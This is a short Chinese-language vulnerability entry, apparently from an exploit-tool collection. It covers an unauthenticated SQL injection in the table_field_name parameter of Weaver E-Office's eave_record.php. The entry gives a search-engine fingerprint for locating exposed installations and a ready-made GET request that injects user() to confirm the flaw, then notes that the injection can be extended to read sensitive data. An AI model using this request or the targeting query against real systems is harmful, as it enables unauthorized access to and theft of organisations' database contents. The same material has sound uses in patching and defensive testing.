---
source: "LittleBear4/OA-EXPTOOL"
---

# 泛微E-Office eave_record.php SQL注入漏洞

## 漏洞描述

泛微 E-Office 的 `/general/charge/charge_list/eave_record.php` 文件的 `table_field_name` 参数存在SQL注入漏洞。攻击者无需登录，通过构造注入语句可执行任意 SQL 查询，获取数据库敏感信息。

## 漏洞影响

```
泛微 E-Office
```

## 网络测绘

```
app="泛微-EOffice"
```

## 漏洞复现

```
GET /general/charge/charge_list/eave_record.php?table_field_name=user() HTTP/1.1
```

若响应中回显当前数据库用户名，则漏洞存在。可进一步构造注入语句读取数据库中的敏感数据。
